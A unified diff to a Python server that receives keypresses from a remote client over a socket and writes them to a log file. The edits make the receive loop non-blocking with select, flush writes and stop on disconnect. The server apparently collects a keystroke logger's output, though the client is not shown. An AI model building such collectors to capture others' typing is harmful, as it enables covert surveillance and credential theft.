@@ -2,6 +2,7 @@ import socket
 import threading
 import queue
 import time
+import select
 
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 4000
@@ -19,6 +20,8 @@ def handle_keypress(client_socket, keypress_queue):
     newline_added = False  # Flag to track if a newline has been added
     last_keypress_time = time.time()  # Track the time of the last keypress
 
+    client_socket.settimeout(0.5)  # Set a timeout for the socket (non-blocking)
+
     with open(file_name, 'a') as file:
         while True:
             try:
@@ -27,19 +30,25 @@ def handle_keypress(client_socket, keypress_queue):
                     if not newline_added:
                         keypress_queue.put('\n')
                         file.write('\n')
+                        file.flush()  # Make sure the newline is written immediately
                         newline_added = True
 
-                keypress = client_socket.recv(BUFFER_SIZE).decode()
-                if not keypress:
-                    continue
+                # Use select to check if data is available to read
+                readable, _, _ = select.select([client_socket], [], [], 0)
+                if readable:
+                    keypress = client_socket.recv(BUFFER_SIZE).decode()
+                    if not keypress:  # If no keypress (client disconnected)
+                        break
 
-                keypress_queue.put(keypress)
-                file.write(keypress)
-                newline_added = False  # Reset the flag when something is written
-                last_keypress_time = time.time()  # Update the last keypress time
+                    keypress_queue.put(keypress)
+                    file.write(keypress)
+                    file.flush()  # Make sure to write immediately
+                    newline_added = False  # Reset the flag when something is written
+                    last_keypress_time = time.time()  # Update the last keypress time
             except Exception as e:
                 print(f"Error: {e}")
                 break
+
     client_socket.close()
 
 # Function to start the server and wait for a connection.
